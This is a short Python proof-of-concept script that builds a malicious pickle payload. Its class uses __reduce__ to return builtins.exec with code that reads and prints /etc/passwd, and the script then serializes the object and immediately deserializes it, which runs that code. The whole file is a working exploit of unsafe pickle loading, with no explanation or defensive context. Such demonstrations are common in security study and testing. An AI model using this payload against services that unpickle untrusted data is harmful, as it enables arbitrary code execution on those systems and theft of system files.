import _pickle as cPickle
import builtins

class execPickle(object):
    def __reduce__(self):
        return (builtins.exec, ("with open('/etc/passwd','r') as r: print(r.readlines())",))

payload = cPickle.dumps(execPickle())
cPickle.loads(payload)
# print (payload)
